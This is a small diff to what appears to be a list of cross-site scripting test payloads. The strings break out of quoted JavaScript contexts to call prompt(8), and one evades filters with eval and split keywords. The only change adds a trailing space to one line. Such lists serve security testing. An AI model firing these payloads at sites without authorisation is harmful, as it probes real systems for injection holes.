@@ -1,6 +1,6 @@
 "-prompt(8)-"
 '-prompt(8)-'
-";a=prompt,a()//
+";a=prompt,a()// 
 ';a=prompt,a()//
 '-eval("window['pro'%2B'mpt'](8)")-'
 "-eval("window['pro'%2B'mpt'](8)")-"
